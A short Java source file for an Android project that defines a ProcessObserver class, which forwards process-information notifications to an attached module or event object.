package com.android.dvci.module;

import com.android.dvci.ProcessInfo;
import com.android.dvci.event.BaseEvent;
import com.android.dvci.interfaces.Observer;

public class ProcessObserver implements Observer<ProcessInfo> {

	private BaseModule module = null;
	private BaseEvent event = null;

	public ProcessObserver(BaseModule module) {
		this.module = module;
	}

	public ProcessObserver(BaseEvent event) {
		this.event = event;
	}

	@Override
	public int notification(ProcessInfo b) {
		if(module != null){
			module.notifyProcess(b);
		}
		if(event != null){
			event.notifyProcess(b);
		}
		return 0;
	}

}
